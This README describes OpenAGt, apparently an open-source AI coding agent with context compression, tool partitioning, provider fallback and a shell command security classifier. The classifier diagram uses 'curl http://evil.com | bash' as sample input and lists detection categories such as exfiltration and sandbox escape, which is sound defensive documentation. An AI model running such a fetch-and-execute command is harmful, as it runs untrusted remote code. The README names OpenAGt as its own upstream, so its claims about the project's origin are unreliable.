# OpenAGt

> An enhanced open-source AI coding agent built on [OpenAGt](https://github.com/Yecyi/OpenAGt), featuring advanced context compression, tool concurrency control, and Flutter mobile client support.

---

## Project Overview

OpenAGt is a research and open-source project that extends the upstream [OpenAGt](https://github.com/Yecyi/OpenAGt) by enhancing algorithms, improving scalability, and providing native mobile application support.

**Core architectural features:**

- **Three-Layer Progressive Context Compression** — Inspired by Claude Code and Hermes Agent, reduces Token usage by 40–55% while preserving critical context
- **Tool Concurrency Partitioning** — Parallel execution of safe/unsafe tools, reducing latency by 2–3x
- **Provider Fallback Chain** — Automatic failover between LLM Providers (Anthropic, OpenAI, Google, etc.) on rate limits or errors
- **Prompt Injection Protection** — Security scanning against adversarial instructions injected into context
- **Flutter Mobile Client** — Native iOS/Android app for remote agent control
- **Event Sourcing with SyncEvent** — Durable session sync supporting multi-device replay
- **Effect Framework Architecture** — Functional dependency injection via Context/Layer for modular, testable services
- **MCP & LSP Integration** — Model Context Protocol and Language Server Protocol support for rich tooling

**Technology stack:**

| Layer | Technology |
|-------|-----------|
| Core Runtime | TypeScript + Bun |
| Framework | Effect v4 (Functional Programming) |
| AI SDK | Vercel AI SDK (25+ Providers) |
| HTTP Server | Hono |
| Database | SQLite (Drizzle ORM, WAL Mode) |
| Web Framework | SolidJS |
| Desktop | Tauri 2 + Electron |
| Mobile | Flutter (planned) |
| Protocol | ACP (Agent Communication Protocol) |
| Event System | SyncEvent (Event Sourcing) |

---

## Table of Contents

- [About OpenAGt](#about-openagt)
- [System Architecture](#system-architecture)
  - [Core Module Dependency Graph](#core-module-dependency-graph)
- [Core Algorithm Details](#core-algorithm-details)
  - [1. Three-Layer Progressive Compression](#1-three-layer-progressive-compression)
  - [2. Tool Concurrency Partitioning](#2-tool-concurrency-partitioning)
  - [3. Provider Fallback Chain](#3-provider-fallback-chain)
  - [4. Shell Security Analysis](#4-shell-security-analysis)
- [Technology Stack](#technology-stack)
- [Project Structure](#project-structure)
- [Quick Start](#quick-start)
  - [Environment Requirements](#environment-requirements)
  - [Install and Run](#install-and-run)
  - [Development Commands](#development-commands)
- [Core Type System](#core-type-system)
  - [MessageV2 Structure](#messagev2-structure)
  - [SyncEvent Event Sourcing](#syncevent-event-sourcing)
- [Extended Reading](#extended-reading)
  - [Detailed Technical Analysis](#detailed-technical-analysis)
  - [Package Documentation](#package-documentation)
  - [Core Module Documentation](#core-module-documentation)
  - [Design System](#design-system)
- [References](#references)
- [License](#license)
- [Contributing](#contributing)

---

## About OpenAGt

OpenAGt is a research and open-source project that builds on [OpenAGt](https://github.com/Yecyi/OpenAGt), extending the original project's capabilities through enhanced algorithms, improved scalability, and native mobile application support.

**Key enhancements over OpenAGt:**

- **Three-Layer Progressive Compression** — Layered context management inspired by Claude Code and Hermes Agent, reducing Token usage by 40–55% while preserving critical information
- **Tool Concurrency Partitioning** — Safe/unsafe tool parallel execution management, reducing latency by 2–3x
- **Provider Fallback Chain** — Automatic switching between LLM Providers (Anthropic, OpenAI, Google, etc.) on rate limits or server errors
- **Prompt Injection Protection** — Security scanning against adversarial instructions in file contents and context
- **Flutter Mobile Client** — Native iOS/Android app for remote agent control
- **Percolation Compression** — Hermes-style core member trait that preserves percolation-compressed context

---

## System Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           Client Layer (Clients)                            │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐ │
│  │   TUI   │  │   Web   │  │ Desktop │  │ Flutter │  │  ACP   │ │
│  │  (CLI)  │  │ (Solid) │  │ (Tauri) │  │  Mobile │  │Protocol│ │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬───┘ │
└────────┼──────────────┼──────────────┼──────────────┼──────────────┼──────┘
         └──────────────┴──────────────┴──────────────┴──────────────┘
                              │
                       HTTP + SSE / WebSocket
                              │
┌─────────────────────────────────────────────────────────────────────────────┐
│               OpenAGt Server (Hono + Effect Framework)                   │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐            │
│  │ Session  │  │   Tool   │  │ Provider │  │Compaction│            │
│  │ Manager  │  │ Registry │  │ Manager  │  │  Engine  │            │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘            │
│  ┌────┴─────┐  ┌────┴─────┐  ┌────┴─────┐  ┌────┴─────┐            │
│  │   LSP   │  │   MCP   │  │Permission│  │   ACP   │            │
│  │ Service │  │ Manager │  │  Engine │  │ Protocol│            │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘            │
│  ┌────┴─────┐  ┌────┴─────┐  ┌────┴─────┐  ┌────┴─────┐            │
│  │   Bus    │  │ Sandbox  │  │  Config  │  │   Sync   │            │
│  │ (PubSub) │  │  Broker │  │  Service │  │  Event   │            │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘            │
└─────────────────────────────────────────────────────────────────────────────┘
                              │
                              │
┌─────────────────────────────────────────────────────────────────────────────┐
│                    SQLite (WAL Mode) + File System                        │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐                              │
│  │  Message │  │  Session │  │  Event   │                              │
│  │  Table   │  │  Table   │  │ Sequence │                              │
│  └──────────┘  └──────────┘  └──────────┘                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Core Module Dependency Graph

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         Effect Framework                                   │
│  ┌──────────────────────────────────────────────────────────────────────┐ │
│  │                  Runtime & Context System                          │ │
│  │  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐      │ │
│  │  │ makeRuntime  │  │ InstanceState │  │   MemoMap     │      │ │
│  │  └───────────────┘  └───────────────┘  └───────────────┘      │ │
│  └──────────────────────────────────────────────────────────────────┘ │
│                                    │                                     │
│       ┌───────────────────────────┼───────────────────────────┐      │
│       │                           │                           │      │
│ �─────┴─────┐             ┌─────┴─────┐             ┌─────┴─────┐ │
│ │  Provider  │             │  Session   │             │   Config   │ │
│ │  Service   │             │  Service   │             │  Service   │ │
│ │            │             │            │             │            │ │
│ │┌─────────┐│             │┌─────────┐ │             │┌─────────┐ │ │
│ ││25+ LLM ││             ││MessageV2│ │             ││ Agent   │ │ │
│ ││Providers││             ││Compaction│ │             ││ Config  │ │ │
│ ││Fallback ││             ││ Token   │ │             ││ Command │ │ │
│ ││ Chain  ││             ││ Budget  │ │             ││ Model   │ │ │
│ │└─────────┘│             │└─────────┘ │             │└─────────┘ │ │
│ └───────────┘             └─────────────┘             └───────────┘ │
│                                    │                                     │
└────────────────────────────────────┼────────────────────────────────────┘
                                     │
      ┌──────────────────────────────┼──────────────────────────────┐
      │                              │                              │
┌─────┴─────┐              ┌─────┴─────┐              ┌─────┴─────┐
│    Bus     │              │  Sandbox   │              │   Sync    │
│  (PubSub)  │              │  Broker   │              │  Event    │
│            │              │           │              │  Sourcing  │
└────────────┘              └───────────┘              └───────────┘
                                     │
┌────────────────────────────────────┼────────────────────────────────────┐
│                        Tool Execution Layer                             │
│  ┌───────────┐              ┌───────────┐              ┌───────────┐ │
│  │   Tool    │              │  Shell    │              │ Security  │
│  │ Partition  │              │ Security  │              │  Scanner  │
│  │           │              │           │              │           │
│  │ Safe:     │              │┌─────────┐│              │┌─────────┐│ │
│  │ read/grep/│              ││Command  ││              ││Injection││ │
│  │ glob/web  │              ││Classifier││              ││Detection││ │
│  │ fetch     │              │└─────────┘│              │└─────────┘│ │
│  │ Unsafe:   │              │           │              │           │
│  │ bash/edit/│              │           │              │           │
│  │ write/task│              │           │              │           │
│  └───────────┘              └───────────┘              └───────────┘ │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Core Algorithm Details

### 1. Three-Layer Progressive Compression

```
Token Usage
│
│ 100% ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
│
│                                    ████████████████████████████
│ 0%  ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
│     Micro    Auto        Full          Blocking
│     Compact  Compact     Compact       Limit
│     ($0)     ($0)       (~$0.03-0.09)
│     Simple   Memory      LLM Summary
│     discard  discard

Compression priority formula:
priority = log(age_minutes + 1) × (11 - importance) + contentWeight × 0.5

Where:
- age_minutes: logarithm of minutes since tool result
- importance: tool importance weight (1–10, 10 = highest)
- contentWeight: content retention exponent (based on content type)
```

### 2. Tool Concurrency Partitioning

```
Tool call sequence: [read, glob, edit, bash, grep, write]
                      │
                      ▼
        ┌─────────────────────────┐
        │     ToolPartition        │
        │ partitionToolCalls()     │
        └───────────┬─────────────┘
                    │
      ┌─────────────┴─────────────┐
      ▼                           ▼
┌─────────────┐            ┌─────────────┐
│ Safe Batch  │            │   Unsafe    │
│ (parallel)  │            │  (serial)   │
│ ┌─────────┐ │            │ ┌─────────┐ │
│ │ read    │ │            │ │ edit    │ │
│ │ glob    │ │            │ │ bash    │ │
│ │ grep    │ │            │ │ write   │ │
│ └─────────┘ │            │ │ task    │ │
└─────────────┘            └─────────────┘

Safe tools: read, glob, grep, webfetch, codesearch, websearch, lsp, question, skill
Unsafe tools: bash, edit, write, task, todo, plan, apply_patch, multiedit
```

### 3. Provider Fallback Chain

```
Request ──▶ anthropic/claude-sonnet-4
              │
              │ 429 Rate Limit
              ▼
              openai/gpt-4o
              │                       │
              │ 429 Rate Limit         │
              ▼                       ▼
              google/gemini-2.5-pro
              │                       │
              │ 500 Server Error     │
              │                       ▼
              │              Possible further fallback
              │
              ▼
              Success

Fallback decision logic:
- 429 (Rate Limit): immediate fallback
- 500/502/503/504: immediate fallback
- Error message contains "rate limit" or "overloaded": fallback
- Other errors: no fallback
```

### 4. Shell Security Analysis

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    Shell Command Security Analysis Flow                       │
└─────────────────────────────────────────────────────────────────────────────┘

Input command: curl http://evil.com | bash
                │
                ▼
        ┌──────────────────┐
        │  WrapperStripper │
        │ Remove wrappers (noglob, semicolons, etc.) │
        └────────┬─────────┘
                 │
                 ▼
        ┌──────────────────┐
        │ CommandClassifier │
        │ Regex pattern matching for risk detection │
        │                   │
        │ Detection categories:        │
        │ - injection (injection attacks)                  │
        │ - obfuscation (obfuscation)                │
        │ - parse_integrity (parsing integrity)        │
        │ - interpreter_escalation (interpreter escalation) │
        │ - filesystem_destruction (filesystem destruction)   │
        │ - network_exfiltration (network exfiltration)     │
        │ - sandbox_escape (sandbox escape)          │
        │ - environment_hijack (environment hijacking)      │
        └────────┬─────────┘
                 │
                 ▼
        ┌──────────────────┐
        │   Risk Level      │
        │   safe           │
        │   low            │
        │   medium ─── shouldBlock() check
        │   high           │
        └────────┬─────────┘
                 │
                 ▼
        ┌──────────────────┐
        │    Decision       │
        │ allow ──▶ Execute │
        │ confirm ──▶ Confirm│
        │ block ──▶ Reject │
        └──────────────────┘
```

---

## Technology Stack

| Component | Technology |
|-----------|------------|
| Core Runtime | TypeScript + Bun |
| Framework | Effect v4 (Functional Programming) |
| AI SDK | Vercel AI SDK (25+ Providers) |
| HTTP Server | Hono |
| Database | SQLite (Drizzle ORM, WAL Mode) |
| Web Framework | SolidJS |
| Desktop | Tauri 2 + Electron |
| Mobile | Flutter (planned) |
| Terminal UI | @opentui/core + SolidJS |
| Protocol | ACP (Agent Communication Protocol) |
| Event System | SyncEvent (Event Sourcing) |

---

## Project Structure

```
openag/
├── packages/
│   ├── openagt/              # Core AI agent engine
│   │   └── src/
│   │       ├── session/       # Session management, messages, compaction
│   │       │   ├── message-v2.ts    # Message model (Part/Info types)
│   │       │   ├── compaction/      # Three-layer compaction engine
│   │       │   │   ├── auto.ts       # AutoCompact + CircuitBreaker
│   │       │   │   ├── importance.ts  # Tool importance calculation
│   │       │   │   └── ...
│   │       │   └── session.ts        # Session Service
│   │       │
│   │       ├── provider/      # LLM Provider management
│   │       │   ├── provider.ts # 25+ Provider loading
│   │       │   ├── fallback.ts  # Fallback chain logic
│   │       │   ├── error.ts     # Error type parsing
│   │       │   └── schema.ts    # Provider/Model type definitions
│   │       │
│   │       ├── tool/          # Tool system
│   │       │   ├── partition.ts # Safe/unsafe concurrency partitioning
│   │       │   ├── registry.ts  # Tool definition registry
│   │       │   ├── truncate.ts  # Result truncation
│   │       │   └── bash.ts, edit.ts, read.ts, glob.ts, grep.ts ...
│   │       │
│   │       ├── security/      # Security protection
│   │       │   ├── shell-security.ts  # Shell command analysis
│   │       │   ├── command-classifier.ts # Risk pattern matching
│   │       │   ├── wrapper-stripper.ts  # Wrapper removal
│   │       │   └── injection.ts   # Prompt injection detection
│   │       │
│   │       ├── bus/           # Event bus (PubSub)
│   │       │   ├── index.ts    # Bus Service + Layer
│   │       │   ├── bus-event.ts # Event definitions
│   │       │   └── global.ts    # GlobalBus cross-process events
│   │       │
│   │       ├── sync/          # Event sourcing
│   │       │   └── index.ts   # SyncEvent.run/replay
│   │       │
│   │       ├── sandbox/       # Sandboxed execution
│   │       │   ├── broker.ts   # IPC Broker process management
│   │       │   ├── policy.ts   # Sandbox policy parsing
│   │       │   └── types.ts   # Type definitions
│   │       │
│   │       ├── config/        # Configuration management
│   │       │   ├── agent.ts   # Agent config
│   │       │   ├── provider.ts # Provider config
│   │       │   ├── command.ts # Command config
│   │       │   └── ...
│   │       │
│   │       ├── effect/        # Effect Framework extensions
│   │       │   ├── run-service.ts  # makeRuntime
│   │       │   ├── instance-state.ts # ScopedCache per instance
│   │       │   ├── memo-map.ts     # Layer deduplication
│   │       │   └── ...
│   │       │
│   │       ├── storage/       # SQLite database
│   │       │   ├── schema.sql.ts   # Drizzle Schema
│   │       │   └── index.ts        # Storage Service
│   │       │
│   │       ├── acp/           # ACP protocol
│   │       ├── lsp/           # LSP service (language intelligence)
│   │       ├── mcp/           # MCP manager (Model Context Protocol)
│   │       ├── permission/    # Permission engine
│   │       └── ...
│   │
│   ├── app/                  # SolidJS Web application
│   ├── desktop/              # Tauri desktop application
│   ├── sdk/                  # Client SDK
│   ├── docs/                  # Mintlify documentation
│   └── enterprise/            # Enterprise edition
│
├── docs/
│   └── TECHNICAL_ANALYSIS_REPORT.md  # Full technical analysis
│
└── Code Reference/
    ├── CC Source Code/   # Claude Code reference implementation
    └── hermes-agent/     # Hermes Agent reference
```

---

## Quick Start

### Environment Requirements

- [Bun](https://bun.sh) 1.0+ or Node.js 20+
- Git

### Install and Run

```bash
# Clone the repository
git clone https://github.com/Yecyi/OpenAGt.git
cd OpenAGt

# Install dependencies
bun install

# Start the server
bun run dev

# Start the TUI in another terminal
bun run openag
```

### Development Commands

```bash
# Type checking
bun typecheck

# Linting
bun lint

# Run tests (from package directory)
bun test packages/openagt
```

---

## Core Type System

### MessageV2 Structure

```
Message
├── User
│   ├── id, sessionID
│   ├── role: "user"
│   ├── format: OutputFormat
│   ├── system?, tools?
│   └── summary?, agent, model
│
├── Assistant
│   ├── id, sessionID
│   ├── role: "assistant"
│   ├── modelID, providerID
│   ├── error?, finish?
│   ├── cost, tokens
│   └── parentID, path, summary
│
└── Parts[]
    ├── TextPart        # Text content
    ├── ReasoningPart    # Reasoning process
    ├── ToolPart        # Tool call
    │   ├── status: pending | running | completed | error
    │   ├── callID, tool
    │   └── state: ToolState*
    ├── FilePart        # File/media
    ├── SnapshotPart    # Snapshot
    ├── CompactionPart  # Compaction marker
    └── StepFinishPart  # Step completion
```

### SyncEvent Event Sourcing

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         SyncEvent Definition                                │
└─────────────────────────────────────────────────────────────────────────────┘
SyncEvent.define({
  type: "session.created",
  version: 1,
  aggregate: "sessionID",  // Aggregate root
  schema: z.object({ sessionID, info })
})
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                         Event Lifecycle                                     │
└─────────────────────────────────────────────────────────────────────────────┘
SyncEvent.run(Created, data)
         │
         ▼
Database.transaction (IMMEDIATE)
         │
         ▼
projector(db, data) ──▶ State mutation
         │
         ▼
EventSequenceTable ──▶ seq = last + 1
         │
         ▼
EventTable ──▶ Persist event
         │
         ▼
Bus.publish ──▶ Global event notification
```

---

## Extended Reading

### Detailed Technical Analysis

For a complete architectural overview, algorithm enhancements, and Flutter feasibility study, refer to:

- [docs/TECHNICAL_ANALYSIS_REPORT.md](./docs/TECHNICAL_ANALYSIS_REPORT.md)

Topics covered:
- Architecture comparison (OpenAGt vs Claude Code vs Hermes Agent)
- Three-layer compaction algorithm design
- Tool concurrency partitioning implementation
- Provider fallback chain design
- Security threat modeling
- Performance benchmarks
- Flutter mobile application feasibility
- Implementation roadmap

### Package Documentation

| Package | Description |
|---------|-------------|
| [packages/openagt/README.md](./packages/openagt/README.md) | Core AI agent engine |
| [packages/app/README.md](./packages/app/README.md) | SolidJS Web application |
| [packages/docs/README.md](./packages/docs/README.md) | Mintlify documentation site |
| [packages/web/README.md](./packages/web/README.md) | Astro Starlight documentation |
| [packages/enterprise/README.md](./packages/enterprise/README.md) | Enterprise features |

### Core Module Documentation

| Module | Description |
|--------|-------------|
| [packages/openagt/src/effect/README.md](./packages/openagt/src/effect/README.md) | Effect Framework integration |
| [packages/openagt/src/acp/README.md](./packages/openagt/src/acp/README.md) | ACP protocol implementation |
| [packages/openagt/src/sync/README.md](./packages/openagt/src/sync/README.md) | SyncEvent event sourcing |
| [packages/openagt/src/provider/README.md](./packages/openagt/src/provider/README.md) | LLM Provider abstraction |
| [packages/openagt/src/bus/README.md](./packages/openagt/src/bus/README.md) | Bus event bus (PubSub) |
| [packages/openagt/src/mcp/README.md](./packages/openagt/src/mcp/README.md) | MCP server management |
| [packages/openagt/src/lsp/README.md](./packages/openagt/src/lsp/README.md) | LSP server and diagnostics |

### Design System

- [OpenAGt Theme Design/](OpenAGt%20Theme%20Design/)

---

## References

- [OpenAGt](https://github.com/Yecyi/OpenAGt) — Base project
- [Hermes Agent](https://github.com/NousResearch/hermes-agent) — Reference implementation
- [Vercel AI SDK](https://sdk.vercel.ai) — AI Provider abstraction
- [Effect Framework](https://effect.website) — Functional programming
- [Drizzle ORM](https://orm.drizzle.team) — SQLite ORM
- [ACP Specification](https://agentclientprotocol.com/) — Agent communication protocol

---

## License

MIT License — see [LICENSE](./LICENSE)

---

## Contributing

Contributions are welcome! Please read the [Contributing Guide](./CONTRIBUTING.md) before submitting PRs.

---

**Note:** OpenAGt is an independent research project. It is not affiliated with, endorsed by, or supported by Anthropic, OpenAI, or the OpenAGt team.
